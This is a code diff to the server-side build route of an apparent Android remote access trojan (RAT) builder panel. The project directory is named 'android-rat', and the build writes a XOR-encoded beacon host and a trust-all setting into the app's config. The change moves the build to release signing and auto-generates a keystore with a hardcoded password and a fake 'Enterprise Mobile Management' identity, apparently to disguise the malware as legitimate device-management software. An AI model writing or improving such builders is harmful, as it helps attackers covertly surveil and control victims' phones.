@@ -152,9 +152,11 @@ router.post("/api/android/builder/config", requireAdmin, (req, res) => {
 });
 
 // ── Server-side APK build ─────────────────────────────────────────────────────
-const PROJECT_DIR = path.resolve(__dirname, "../../docs/38-android-rat/project");
-const ASSETS_DIR  = path.join(PROJECT_DIR, "app/src/main/assets");
-const APK_OUT     = path.join(PROJECT_DIR, "app/build/outputs/apk/debug/app-debug.apk");
+const PROJECT_DIR  = path.resolve(__dirname, "../../docs/38-android-rat/project");
+const ASSETS_DIR   = path.join(PROJECT_DIR, "app/src/main/assets");
+const KEYSTORE_DIR = path.join(PROJECT_DIR, "app/keystore");
+const KEYSTORE_PATH = path.join(KEYSTORE_DIR, "release.jks");
+const APK_OUT      = path.join(PROJECT_DIR, "app/build/outputs/apk/release/app-release.apk");
 
 const IS_WIN  = process.platform === "win32";
 const GRADLEW = path.join(PROJECT_DIR, IS_WIN ? "gradlew.bat" : "gradlew");
@@ -231,6 +233,31 @@ function resolveAndroidHome() {
     return null;
 }
 
+// Auto-generate a release keystore if it doesn't exist yet.
+// Uses keytool from the same JDK we detected for the build.
+function ensureKeystore(send) {
+    if (fs.existsSync(KEYSTORE_PATH)) return true;
+    try {
+        if (!fs.existsSync(KEYSTORE_DIR)) fs.mkdirSync(KEYSTORE_DIR, { recursive: true });
+        const { execSync } = require("child_process");
+        const jh = resolveJavaHome();
+        const keytool = jh ? `${jh}/bin/keytool` : "keytool";
+        execSync(
+            `"${keytool}" -genkeypair -v` +
+            ` -keystore "${KEYSTORE_PATH}"` +
+            ` -alias release -keyalg RSA -keysize 2048 -validity 10000` +
+            ` -storepass "Android2024!" -keypass "Android2024!"` +
+            ` -dname "CN=Enterprise Mobile Management, OU=IT, O=Enterprise Corp, L=New York, ST=NY, C=US"`,
+            { encoding: "utf8", stdio: "pipe" }
+        );
+        send("[INFO] Release keystore generated → " + KEYSTORE_PATH);
+        return true;
+    } catch (e) {
+        send("[WARN] Keystore generation failed: " + e.message);
+        return false;
+    }
+}
+
 let buildRunning = false;
 
 router.post("/api/android/builder/build", requireAdmin, (req, res) => {
@@ -273,14 +300,17 @@ router.post("/api/android/builder/build", requireAdmin, (req, res) => {
 
     send(`[INFO] Auto-detected host: ${host}`);
     send(`[INFO] config.json written (host XOR-encoded) → ${JSON.stringify({ trust_all, beacon_interval_ms: beacon_ms })}`);
-    send("[INFO] Starting Gradle build — this takes 1–3 minutes on first run...");
+
+    ensureKeystore(send);
+
+    send("[INFO] Starting Gradle build (release) — this takes 1–3 minutes on first run...");
 
     buildRunning = true;
 
     // On Linux: run ./gradlew directly; on Windows: run via cmd.exe
     const [cmd, args] = IS_WIN
-        ? ["cmd.exe", ["/c", `"${GRADLEW}" assembleDebug`]]
-        : [GRADLEW, ["assembleDebug"]];
+        ? ["cmd.exe", ["/c", `"${GRADLEW}" assembleRelease`]]
+        : [GRADLEW, ["assembleRelease"]];
 
     const spawnEnv = { ...process.env, JAVA_OPTS: "-Xmx1g" };
     if (!IS_WIN) {
